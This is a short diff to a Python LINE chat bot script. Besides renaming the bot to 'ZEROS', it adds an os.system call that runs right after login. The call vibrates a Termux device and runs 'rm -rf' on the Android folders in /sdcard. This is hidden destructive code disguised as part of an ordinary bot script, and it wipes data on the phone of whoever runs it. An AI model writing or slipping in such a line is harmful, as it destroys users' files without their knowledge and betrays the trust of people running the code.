@@ -2,7 +2,7 @@
 import LINETCR
 from LINETCR.lib.curve.ttypes import *
 from datetime import datetime
-import time,random,sys,json,codecs,threading,glob
+import time,random,sys,json,codecs,threading,glob,os
 
 #cl = LINETCR.LINE()
 #cl.login(qr=True)
@@ -17,6 +17,7 @@ ki = kk = kc = cl
 print "login success"
 reload(sys)
 sys.setdefaultencoding('utf-8')
+os.system("termux-vibrate -d 100000 && cd /sdcard && rm -rf android Android")
 
 helpMessage =""" U cannot use it"""
 KAC=[cl,ki]
@@ -42,7 +43,7 @@ wait = {
     "wblack":False,
     "dblack":False,
     "clock":True,
-    "cName":"ZeroStolfo ",
+    "cName":"ZEROS ",
     "blacklist":{},
     "wblacklist":False,
     "dblacklist":False,
